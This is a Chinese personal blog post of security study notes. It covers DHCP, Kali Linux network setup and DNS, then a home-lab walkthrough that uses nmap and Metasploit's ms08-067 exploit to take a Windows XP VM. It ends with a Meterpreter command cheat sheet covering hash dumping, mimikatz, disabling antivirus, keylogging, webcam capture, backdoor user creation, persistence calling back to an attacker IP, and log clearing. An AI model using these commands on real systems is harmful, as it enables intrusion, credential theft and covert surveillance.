<p>客户端在租期时间到之前，如果用户不想使用分配的IP地址（例如客户端网络位置需要变更），会触发DHCP客户端向DHCP服务器发送DHCP RELEASE报文，通知DHCP服务器释放IP地址的租期。DHCP服务器会保留这个DHCP客户端的配置信息，将IP地址列为曾经分配过的IP地址中，以便后续重新分配给该客户端或其他客户端。客户端可以通过发送DHCP INFORM报文向服务器请求更新配置信息。</p>
<p>如下图所示，部署DHCP中继时，更新租期的过程与上述过程相似。</p>
<p><img src="/WebSecurity.assets/download-1674187538759.png" alt="客户端通过DHCP中继更新租期示意图"><br>客户端通过DHCP中继更新租期示意图</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p><img src="/WebSecurity.assets/1674187607309.png" alt="1674187607309"></p>
<h1 id="Linux系统如何配置动态ip服务"><a href="#Linux系统如何配置动态ip服务" class="headerlink" title="Linux系统如何配置动态ip服务"></a>Linux系统如何配置动态ip服务</h1><blockquote>
<p>刚开始是想看一下winXP怎么自动获取ip的，搞了半天命令行，后来意识到我又不是linux系统，不应该点一点就可以了吗？找了一会儿网上邻居没找到，最后在右下角随便点了点之后发现，有个tcp/ip可以搞定自动配置ip呢.</p>
</blockquote>
<p>贴上图：</p>
<p><img src="/WebSecurity.assets/1674188825643.png" alt="1674188825643"></p>
<p><img src="/WebSecurity.assets/1674188863184.png" alt="1674188863184"></p>
<p><img src="/WebSecurity.assets/1674188898069.png" alt="1674188898069"></p>
<p><img src="/WebSecurity.assets/1674188926447.png" alt="1674188926447"></p>
<p>测试ping 一下百度：<img src="/WebSecurity.assets/1674188958714.png" alt="1674188958714"></p>
<p>查看ip地址 ipconfig</p>
<p><img src="/WebSecurity.assets/1674189155779.png" alt="1674189155779"></p>
<p>kali Linux的ip设置</p>
<h2 id="一-设置IP地址"><a href="#一-设置IP地址" class="headerlink" title="一. 设置IP地址"></a>一. 设置IP地址</h2><p>动/静态 IP 地址设置路径：</p>
<pre class="line-numbers language-none"><code class="language-none">vim /etc/network/interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="1-1-动态IP"><a href="#1-1-动态IP" class="headerlink" title="1.1 动态IP"></a>1.1 动态IP</h3><p>配置文件：</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># This file describes the network interfaces available on your system</span>
<span class="token comment"># and how to activate them. For more information, see interfaces(5).</span>

<span class="token key attr-name">source</span> <span class="token value attr-value">/etc/network/interfaces.d/*</span>

<span class="token comment"># The loopback network interface</span>
<span class="token key attr-name">auto</span> <span class="token value attr-value">lo</span>
<span class="token key attr-name">iface</span> <span class="token value attr-value">lo inet loopback</span>
<span class="token key attr-name">auto</span> <span class="token value attr-value">eth0</span>
<span class="token key attr-name">iface</span> <span class="token value attr-value">eth0 inet dhcp</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>dhcp 是自动获取 IP 地址。 </p>
<h3 id="1-2-静态IP"><a href="#1-2-静态IP" class="headerlink" title="1.2 静态IP"></a>1.2 静态IP</h3><p>配置内容：</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># This file describes the network interfaces available on your system</span>
<span class="token comment"># and how to activate them. For more information, see interfaces(5).</span>

<span class="token key attr-name">source</span> <span class="token value attr-value">/etc/network/interfaces.d/*</span>

<span class="token comment"># The loopback network interface</span>
<span class="token key attr-name">auto</span> <span class="token value attr-value">lo</span>
<span class="token key attr-name">iface</span> <span class="token value attr-value">lo inet loopback</span>
<span class="token key attr-name">auto</span> <span class="token value attr-value">eth0</span>
<span class="token key attr-name">iface</span> <span class="token value attr-value">eth0 inet static</span>
<span class="token key attr-name">address</span> <span class="token value attr-value">192.168.7.53</span>
<span class="token key attr-name">netmask</span> <span class="token value attr-value">255.255.255.0</span>
<span class="token key attr-name">gateway</span> <span class="token value attr-value">192.168.7.1</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p> 其中，static 为获取静态 IP； address 为静态 IP 地址； netmask 为子网掩码； gateway 为网关。 网关为 192.168.7.1，则静态 IP 地址要为192.168.7.xxx 。 </p>
</blockquote>
<h3 id="1-3-总结"><a href="#1-3-总结" class="headerlink" title="1.3 总结"></a>1.3 总结</h3><p>auto lo 与 auto eth0 说明 lo 接口跟 eth0 接口会在系统启动时被自动配置；<br>iface lo inet loopback 将 lo 接口设置为一个本地回环（ loopback ）地址；<br>iface eth0 inet static 设置 eth0 接口具有一个静态的（ static ）IP配置，dhcp 为自动获取 IP。<br>address、 network、netmask、broadcast、gateway 分别设置 eth0 接口的 IP、网络号、掩码、广播地址和网关。<br>修改好 IP 之后要重启网卡：</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">/etc/init.d/networking</span> <span class="token value attr-value">restart</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/WebSecurity.assets/1674191278487.png" alt="1674191278487"></p>
<p>已经和主机同一网段了。</p>
<h2 id="二-修改DNS"><a href="#二-修改DNS" class="headerlink" title="二. 修改DNS"></a>二. 修改DNS</h2><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">cat</span> <span class="token value attr-value">/etc/resolv.conf </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>/etc/resolv.conf 文件是 DNS 客户机配置文件，用于设置 DNS 服务器的 IP 地址及 DNS 域名，还包含了主机的域名搜索顺序。该文件是由域名解析器（resolver ：一个根据主机名解析IP地址的库）使用的配置文件。<br>resolv.conf 的关键字主要有四个，分别是：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">nameserver    <span class="token comment">//定义DNS服务器的IP地址</span>
domain       <span class="token comment">//定义本地域名</span>
search        <span class="token comment">//定义域名的搜索列表</span>
sortlist        <span class="token comment">//对返回的域名进行排序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>详细参考链接<a target="_blank" rel="noopener" href="https://www.cnblogs.com/klb561/p/9159006.html">https://www.cnblogs.com/klb561/p/9159006.html</a></p>
</blockquote>
<h4 id="DNS回顾"><a href="#DNS回顾" class="headerlink" title="DNS回顾"></a>DNS回顾</h4><p>DNS（Domain Name System，域名系统），因特网上作为域名和IP地址互相映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名，最终得到该主机对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p>
<p>DNS的分布数据库是以域名为索引的，每个域名实际上就是一棵很大的逆向树中路径，这棵逆向树称为域名空间（domain name space），如下图所示树的最大深度不得超过127层，树中每个节点都有一个可以长达63个字符的文本标号。</p>
<ul>
<li><strong>DNS的作用</strong></li>
</ul>
<p>DNS系统的作用</p>
<p>正向解析：根据主机名称（域名）查找对应的IP地址</p>
<p>反向解析：根据IP地址查找对应的主机域名</p>
<p>DNS系统的分布式数据结构</p>
<p><img src="/WebSecurity.assets/v2-1455270ae0d753856037a9e432a8f79b_1440w.webp" alt="img"></p>
<h1 id="网络模式"><a href="#网络模式" class="headerlink" title="网络模式"></a>网络模式</h1><p>用kali攻击xp，首先把两个都设置成同一网络模式，不是同一网络模式，攻击起来回复杂一点；</p>
<p>桥接模式：在同一局域网当中，和物理机是同一网段；</p>
<p><img src="/WebSecurity.assets/1674192861199.png" alt="1674192861199"></p>
<p>NAT模式：</p>
<p><img src="/WebSecurity.assets/1674193056027.png" alt="1674193056027"></p>
<p> 虚拟机设置为NAT模式，它的ip地址不一定和物理机的ip同一网段，可以随便来，当它要去访问外部资源的时候，先要经过物理机，然后再到目标资源的地方；</p>
<p><img src="/WebSecurity.assets/1674193094733.png" alt="1674193094733"></p>
<p>当这个物理环境当中又出现了一个和物理机同一网段的机器时，比如它想访问虚拟机，这个时候是访问不了的，但是虚拟机可以通过物理机去访问这台机器；</p>
<p>仅主机模式：</p>
<p>访问不了外界，最多是同一网段里面的机器；</p>
<h1 id="NMAP初体验"><a href="#NMAP初体验" class="headerlink" title="NMAP初体验"></a>NMAP初体验</h1><p><img src="/WebSecurity.assets/1674193705463.png" alt="1674193705463"></p>
<p>-A 包含了-O（操作系统识别）和-Sv（开放服务版本号的服识别）</p>
<p><img src="/WebSecurity.assets/1674193904071.png" alt="1674193904071"></p>
<ol>
<li>主机发现，扫描目标网段当中的存活主机（默认使用ping命令进行探测的）；</li>
<li>端口扫描，通过第一步对存活主机的发现，现在对存活主机上面运行的端口进行扫描；</li>
<li>每开放一个端口，就会有一个服务，对这个服务的版本进行一个侦测；</li>
<li>是windows的还是linux还是其他操作系统？</li>
</ol>
<p><img src="/WebSecurity.assets/1674195430170.png" alt="1674195430170"></p>
<p>扫描出来的结果，有四列。</p>
<p>最后一列是版本号，我去搜索一下这个版本号有没有扫描漏洞，之后进行一个漏洞复现，如果符合结果，说明这台机器有这个漏洞。</p>
<p><strong>如何判断目标主机存在某某漏洞</strong></p>
<ul>
<li>nmap 扫描热门历史漏洞</li>
<li>漏洞扫描器</li>
<li>某某漏洞的验证脚本</li>
</ul>
<blockquote>
<p> 在命令行输入：nmap –script=vuln 192.168.1.108</p>
</blockquote>
<p><img src="/WebSecurity.assets/1674201246029.png" alt="1674201246029"></p>
<p>存在两个漏洞以及详细信息</p>
<p>下面那个是永恒之蓝ms17-010，可以搜索以下ms17-010漏洞复现。到这一步，我们通过nmap做信息收集，发现winXP最少存在两个漏洞。</p>
<h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>输入msfconsole 进入</p>
<p><img src="/WebSecurity.assets/1674196464874.png" alt="1674196464874"></p>
<p>以下为初始界面：</p>
<p><img src="/WebSecurity.assets/1674198959115.png" alt="1674198959115"></p>
<p>可以说这里的exploits相当于一个炮筒，只负责建立通道，payload攻击载荷相当于炮弹，两者配合使用。</p>
<p>搜索一个漏洞：</p>
<p><img src="/WebSecurity.assets/1674201549204.png" alt="1674201549204"></p>
<p><img src="/WebSecurity.assets/1674201665233.png" alt="1674201665233"></p>
<blockquote>
<p>远程代码执行 （RCE） 是一类软件安全缺陷/漏洞。RCE 漏洞将允许恶意行为人通过 LAN、WAN 或 Internet 在远程计算机上执行自己选择的任何代码。 </p>
</blockquote>
<hr>
<p>一个小插曲：还没做完实验，新买的路由器到了，结果我的网连不上了，物理机和xp可以我记得我早上设置了动态获取的呀，只好重启了一下，就好了，里外都ping通了。</p>
<hr>
<p><strong>操作</strong></p>
<ol>
<li><p>search ms08-067 会发现有一个exploits</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">#  Name                                    Date  ..</span>
<span class="token key attr-name"> -----</span> <span class="token value attr-value"> ----   -----  -----------</span>
<span class="token key attr-name">0</span> <span class="token value attr-value"> exploit/windows/smb/ms08_067_netapi  2008-10-28.. </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


</li>
<li><p>使用exploits，命令  use 0(或者使用名称)；</p>
</li>
<li><p><img src="/WebSecurity.assets/1674204012965.png" alt="1674204012965"></p>
<p>这里没有payload，默认给你一个针对windows的，受害者给你一个meterpreter的操作平台，reverse_tcp指的是返回给你,bind_tcp是正向，主动发出，我们先查看一下命令 options；</p>
<p><img src="/WebSecurity.assets/1674204188534.png" alt="1674204188534"></p>
<p>这里Required是yes都需要我们填，这里只有一个Rhost没有填，需要我们填一下，就是我的目标主机的ip地址；</p>
<ol start="4">
<li><p><img src="/WebSecurity.assets/1674204382924.png" alt="1674204382924"></p>
<p>设置一下这个选项；</p>
</li>
</ol>
<p>5.开始攻击 命令：run / exploit</p>
<p><img src="/WebSecurity.assets/1674204654192.png" alt="1674204654192"></p>
<p>可以看到攻击成功会在最后返回一个session，并在最后返回一个叫做meterpreter的控制台，（这里没截到下面的控制台的图）；</p>
<ol start="6">
<li><p><img src="/WebSecurity.assets/1674204893357.png" alt="1674204893357"></p>
<p>攻击成功之后查看当前的用户的权限，当前为system</p>
<p><img src="/WebSecurity.assets/1674204958058.png" alt="1674204958058"></p>
<p>查看当前进程1024；</p>
</li>
<li><p>输入help 查看可以做什么；</p>
</li>
</ol>
</li>
</ol>
<p>​             发现有核心命令：</p>
<p><img src="/WebSecurity.assets/1674205067171.png" alt="1674205067171"></p>
<p>8.试验一下查看被控制winXP的ip<img src="/WebSecurity.assets/1674206189842.png" alt="1674206189842"></p>
<p>查看永恒之蓝：</p>
<p><img src="/WebSecurity.assets/1674207210868.png" alt="1674207210868"></p>
<p>该脚本不支持打winXP.</p>
<p><strong>payload</strong>类型</p>
<p><img src="/WebSecurity.assets/1674207916888.png" alt="1674207916888"></p>
<blockquote>
<p> 查看进程的命令：tasklist</p>
</blockquote>
<p><img src="/WebSecurity.assets/1674208141035.png" alt="1674208141035"></p>
<p>可以到被控制的机器winXP里面看到被控制的端口悄悄加载一个dll链接文件，</p>
<p>**主动的方式有什么好处呢? bind_tcp **</p>
<blockquote>
<p>现在假设kali是nat模式，xp是桥接模式，现在kali可以访问xp，但是由于kali是nat模式它访问不了，这个时候我kali就只能主动一点了，因为xp访问不了nat模式呀，别指望着reverse_tcp了！</p>
</blockquote>
<h1 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h1><p><img src="/WebSecurity.assets/1674209111562.png" alt="1674209111562"></p>
<p>第九步，需要使用shell(Dos命令)使用net user；</p>
<blockquote>
<p>如何判断是否接入成功；</p>
<p>rdesktop + 目标主机的ip (直接打开命令行界面输入，前提需要开启远程桌面)</p>
</blockquote>
<blockquote>
<p>run vnc 查看目标主机的各种操作，可视化。</p>
<p>“输入第二次才成功。”</p>
</blockquote>
<blockquote>
<p>迁移进程 migrate + pid</p>
<p>开启远程桌面 run getgui -e</p>
</blockquote>
<blockquote>
<p><strong>nmap –script=vuln [ip]</strong></p>
<p>扫描常见的漏洞：nmap具备漏洞扫描的功能，可以检查目标主机或网段是否存在常见的漏洞。</p>
</blockquote>
<hr>
<h1 id="演示上传修改文件"><a href="#演示上传修改文件" class="headerlink" title="演示上传修改文件"></a>演示上传修改文件</h1><ol>
<li><p>在kali linux之下创建一个文件hello.txt文件(没有会创建一个出来)写入hello。</p>
<blockquote>
<p>echo hello &gt; hello.txt</p>
</blockquote>
</li>
<li><p>将此文件上传到目标主机的电脑里面；</p>
<blockquote>
<p>upload /home/kali/hello.txt  c:\\first.txt</p>
<p>​                kali的文件位置         目标主机的位置注意是\</p>
</blockquote>
</li>
</ol>
<p>3.在目标主机的桌面上打开文件</p>
<blockquote>
<ol>
<li><p>先切换到shell ，直接输入c:\hello.txt</p>
</li>
<li><p>发现并没有打开，应该是 权限不是管理员， getuid是system，但是XP当前登录的是administer，权限不一样，所以这里需要做一些操作：</p>
<ol>
<li><p>ps 查看XP的进程</p>
</li>
<li><p>迁移一个权限是administer的进程migrate + pid</p>
</li>
<li><p>进入shell打开文件 c:\first.txt</p>
</li>
<li><p>对面进行了回复，查看文件，在shell里输入type c:\first.txt</p>
</li>
<li><p>编辑该文件内容 输入edit c:\\first.txt 这里需要双“\”</p>
</li>
<li><p>输入dir ，查看目标主机的文件目录，找到桌面的路径，复制一下，因为有空格之后用双引号把路径放到里面；</p>
</li>
<li><p><img src="/WebSecurity.assets/1674221769186.png" alt="1674221769186"></p>
<p>上传成功。</p>
</li>
</ol>
</li>
</ol>
</blockquote>
<ul>
<li>一些参考命令：</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">   sysinfo             #查看目标主机系统信息
run scraper         #查看目标主机详细信息
run hashdump        #导出密码的哈希
load mimikatz       #加载mimikatz  查看密文 kerberos || Wdigest
ps                  #查看目标主机进程信息
pwd                 #查看目标当前目录(windows)
getlwd              #查看目标当前目录(Linux)
search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件
download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下
upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下
getpid              #查看当前Meterpreter Shell的进程PID
migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
idletime            #查看主机运行时间
getuid              #查看获取的当前权限
getsystem           #提权
run  killav         #关闭杀毒软件
screenshot          #截图
webcam_list         #查看目标主机的摄像头
webcam_snap         #拍照
webcam_stream       #开视频
execute  参数  -f 可执行文件   #执行可执行程序
run getgui -u hack -p 123    #创建hack用户，密码为123
run getgui -e                #开启远程桌面
keyscan_start                #开启键盘记录功能
keyscan_dump                 #显示捕捉到的键盘记录信息
keyscan_stop                 #停止键盘记录功能
uictl  disable  keyboard     #禁止目标使用键盘
uictl  enable   keyboard     #允许目标使用键盘
uictl  disable  mouse        #禁止目标使用鼠标
uictl  enable   mouse        #允许目标使用鼠标
load                         #使用扩展库
run                     #使用扩展库
 
run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀

portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
clearev                       #清除日志



run post/windows/manage/migrate           #自动进程迁移
run post/windows/gather/checkvm           #查看目标主机是否运行在虚拟机上
run post/windows/manage/killav            #关闭杀毒软件
run post/windows/manage/enable_rdp        #开启远程桌面服务
run post/windows/manage/autoroute         #查看路由信息
run post/windows/gather/enum_logged_on_users    #列举当前登录的用户
run post/windows/gather/enum_applications       #列举应用程序
run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码
run windows/gather/smart_hashdump               #dump出所有用户的hash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">carrot</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://carrot11223.github.io/2023/01/28/websecurity/">https://carrot11223.github.io/2023/01/28/websecurity/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">carrot</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="far fa-dot-circle"></i>&nbsp;本篇
            </div>
            <div class="card">
                <a href="/2023/01/28/websecurity/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                        
                        <span class="card-title"></span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-28
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            carrot
                            
                        </span>
                    </div>
                </div>

                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                本篇&nbsp;<i class="far fa-dot-circle"></i>
            </div>
            <div class="card">
                <a href="/2023/01/28/websecurity/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                        
                        <span class="card-title"></span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-28
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            carrot
                            
                        </span>
                    </div>
                </div>

                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">carrot</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
                <span id="translate">|&nbsp;繁/简：</span><a id="translateLink" href="javascript:translatePage();">繁</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">7.5k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/carrot11223" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="2929608241@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2929608241" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
